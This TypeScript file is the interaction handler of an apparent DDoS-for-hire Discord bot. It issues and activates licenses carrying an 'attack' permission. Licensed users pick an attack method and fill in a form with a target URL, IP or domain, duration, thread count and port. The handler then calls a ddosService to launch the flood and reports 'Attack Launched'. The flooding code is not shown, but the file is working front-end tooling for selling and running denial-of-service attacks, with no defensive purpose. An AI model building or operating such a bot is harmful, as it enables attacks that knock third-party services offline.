import { Events, Interaction, ModalSubmitInteraction, StringSelectMenuInteraction } from 'discord.js';
import { commands } from '../commands';
import { logger } from '../utils/logger';
import { licenseService } from '../services/license';
import { ddosService } from '../services/ddos';
import { isValidUrl, isValidIp, isValidDomain, isValidDuration, isValidThreads } from '../utils/validators';
import { EmbedBuilder } from 'discord.js';

export const name = Events.InteractionCreate;

async function handleModalSubmit(interaction: ModalSubmitInteraction): Promise<void> {
  const customId = interaction.customId;

  if (customId.startsWith('license_create_')) {
    const userId = customId.replace('license_create_', '');
    const days = parseInt(interaction.fields.getTextInputValue('days') || '0', 10);
    const permissions = interaction.fields.getTextInputValue('permissions')?.split(',').map((p) => p.trim()) || ['bot', 'attack'];

    const expiresInDays = days === 0 ? null : days;
    const licenseKey = licenseService.createLicense(userId, expiresInDays, permissions);

    const embed = new EmbedBuilder()
      .setTitle('✅ License Created')
      .setColor(0x00ff00)
      .addFields(
        { name: 'User', value: `<@${userId}>`, inline: true },
        { name: 'License Key', value: `\`${licenseKey}\``, inline: false },
        { name: 'Expires', value: expiresInDays ? `In ${expiresInDays} days` : 'Never', inline: true },
        { name: 'Permissions', value: permissions.join(', '), inline: true }
      )
      .setTimestamp();

    await interaction.reply({ embeds: [embed], ephemeral: true });
    return;
  }

  if (customId.startsWith('license_activate_')) {
    const licenseKey = interaction.fields.getTextInputValue('license_key')?.trim().toUpperCase();

    if (!licenseKey) {
      await interaction.reply({
        content: '❌ Please enter a license key.',
        ephemeral: true,
      });
      return;
    }

    const validation = licenseService.validateLicenseKey(licenseKey);
    if (!validation.valid || !validation.license) {
      await interaction.reply({
        content: '❌ Invalid or expired license key.',
        ephemeral: true,
      });
      return;
    }

    const license = validation.license;

    if (license.userId && license.userId !== interaction.user.id) {
      await interaction.reply({
        content: '❌ This license key belongs to another user.',
        ephemeral: true,
      });
      return;
    }

    const existingLicense = licenseService.getLicense(interaction.user.id);
    if (existingLicense) {
      if (existingLicense.licenseKey === licenseKey) {
        const embed = new EmbedBuilder()
          .setTitle('✅ License Already Active')
          .setColor(0x00ff00)
          .setDescription('This license is already activated on your account.')
          .setTimestamp();

        await interaction.reply({ embeds: [embed], ephemeral: true });
        return;
      } else {
        await interaction.reply({
          content: '❌ You already have an active license. Contact an admin to change it.',
          ephemeral: true,
        });
        return;
      }
    }

    if (license.userId === interaction.user.id) {
      const embed = new EmbedBuilder()
        .setTitle('✅ License Activated')
        .setColor(0x00ff00)
        .setDescription('Your license has been activated successfully!')
        .addFields(
          { name: 'License Key', value: `\`${licenseKey}\``, inline: false },
          { name: 'Permissions', value: license.permissions.join(', '), inline: true },
          { name: 'Expires', value: license.expiresAt ? new Date(license.expiresAt).toLocaleDateString() : 'Never', inline: true }
        )
        .setTimestamp();

      await interaction.reply({ embeds: [embed], ephemeral: true });
      return;
    }

    licenseService.revokeLicense(license.userId);
    const expiresInDays = license.expiresAt ? Math.floor((license.expiresAt - Date.now()) / (1000 * 60 * 60 * 24)) : null;
    licenseService.createLicense(interaction.user.id, expiresInDays, license.permissions);

    const embed = new EmbedBuilder()
      .setTitle('✅ License Activated')
      .setColor(0x00ff00)
      .setDescription('Your license has been activated successfully!')
      .addFields(
        { name: 'License Key', value: `\`${licenseKey}\``, inline: false },
        { name: 'Permissions', value: (license?.permissions || ['bot', 'attack']).join(', '), inline: true }
      )
      .setTimestamp();

    await interaction.reply({ embeds: [embed], ephemeral: true });
    return;
  }

  if (customId.startsWith('attack_config_')) {
    const method = customId.replace('attack_config_', '') as any;
    const target = interaction.fields.getTextInputValue('target')?.trim();
    const duration = parseInt(interaction.fields.getTextInputValue('duration') || '60', 10);
    const threads = parseInt(interaction.fields.getTextInputValue('threads') || '50', 10);
    const port = interaction.fields.getTextInputValue('port') ? parseInt(interaction.fields.getTextInputValue('port') || '80', 10) : undefined;

    if (!target || (!isValidUrl(target) && !isValidIp(target) && !isValidDomain(target))) {
      await interaction.reply({
        content: '❌ Invalid target. Please provide a valid URL, IP address, or domain.',
        ephemeral: true,
      });
      return;
    }

    if (!isValidDuration(duration)) {
      await interaction.reply({
        content: '❌ Invalid duration. Maximum allowed: 300 seconds.',
        ephemeral: true,
      });
      return;
    }

    if (!isValidThreads(threads)) {
      await interaction.reply({
        content: '❌ Invalid thread count. Maximum allowed: 100.',
        ephemeral: true,
      });
      return;
    }

    await interaction.deferReply({ ephemeral: true });

    try {
      const config = {
        target,
        method,
        duration,
        threads,
        port,
      };

      await ddosService.start(config);

      const embed = new EmbedBuilder()
        .setTitle('🚀 Attack Launched')
        .setColor(0xff0000)
        .addFields(
          { name: 'Target', value: target, inline: true },
          { name: 'Method', value: method, inline: true },
          { name: 'Duration', value: `${duration}s`, inline: true },
          { name: 'Threads', value: threads.toString(), inline: true },
          { name: 'Port', value: port ? port.toString() : 'N/A', inline: true }
        )
        .setTimestamp();

      await interaction.editReply({ embeds: [embed] });

      logger.info(`Attack launched by ${interaction.user.id} on ${target}`);
    } catch (error: any) {
      logger.error('Failed to launch attack', error);
      await interaction.editReply({
        content: `❌ Failed to launch attack: ${error.message}`,
      });
    }
    return;
  }
}

async function handleStringSelect(interaction: StringSelectMenuInteraction): Promise<void> {
  if (interaction.customId === 'attack_method_select') {
    if (!licenseService.hasPermission(interaction.user.id, 'attack')) {
      await interaction.reply({
        content: '❌ You need a valid license with attack permission.',
        ephemeral: true,
      });
      return;
    }

    const method = interaction.values[0];

    const { ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } = await import('discord.js');

    const modal = new ModalBuilder()
      .setCustomId(`attack_config_${method}`)
      .setTitle(`Configure ${method} Attack`);

    const targetInput = new TextInputBuilder()
      .setCustomId('target')
      .setLabel('Target (URL, IP, or Domain)')
      .setStyle(TextInputStyle.Short)
      .setPlaceholder('https://example.com or 192.168.1.1')
      .setRequired(true);

    const durationInput = new TextInputBuilder()
      .setCustomId('duration')
      .setLabel('Duration (seconds, max 300)')
      .setStyle(TextInputStyle.Short)
      .setPlaceholder('60')
      .setValue('60')
      .setRequired(true)
      .setMaxLength(3);

    const threadsInput = new TextInputBuilder()
      .setCustomId('threads')
      .setLabel('Threads (max 100)')
      .setStyle(TextInputStyle.Short)
      .setPlaceholder('50')
      .setValue('50')
      .setRequired(true)
      .setMaxLength(3);

    const portInput = new TextInputBuilder()
      .setCustomId('port')
      .setLabel('Port (optional, for TCP/UDP)')
      .setStyle(TextInputStyle.Short)
      .setPlaceholder('80')
      .setRequired(false)
      .setMaxLength(5);

    const targetRow = new ActionRowBuilder().addComponents(targetInput);
    const durationRow = new ActionRowBuilder().addComponents(durationInput);
    const threadsRow = new ActionRowBuilder().addComponents(threadsInput);
    const portRow = new ActionRowBuilder().addComponents(portInput);

    modal.addComponents(targetRow, durationRow, threadsRow, portRow);

    await interaction.showModal(modal);
    return;
  }
}

export async function execute(interaction: Interaction): Promise<void> {
  if (interaction.isModalSubmit()) {
    try {
      await handleModalSubmit(interaction);
    } catch (error) {
      logger.error('Error handling modal submit', error as Error);
      if (!interaction.replied && !interaction.deferred) {
        await interaction.reply({
          content: '❌ An error occurred while processing your request.',
          ephemeral: true,
        });
      }
    }
    return;
  }

  if (interaction.isStringSelectMenu()) {
    try {
      await handleStringSelect(interaction);
    } catch (error) {
      logger.error('Error handling string select', error as Error);
      if (!interaction.replied && !interaction.deferred) {
        await interaction.reply({
          content: '❌ An error occurred while processing your selection.',
          ephemeral: true,
        });
      }
    }
    return;
  }

  if (!interaction.isChatInputCommand()) return;

  const command = commands.get(interaction.commandName);

  if (!command) {
    logger.warn(`Command ${interaction.commandName} not found`);
    return;
  }

  try {
    await command.execute(interaction);
  } catch (error) {
    logger.error(`Error executing command ${interaction.commandName}`, error as Error);

    const reply = {
      content: '❌ An error occurred while executing this command.',
      ephemeral: true,
    };

    if (interaction.replied || interaction.deferred) {
      await interaction.followUp(reply);
    } else {
      await interaction.reply(reply);
    }
  }
}

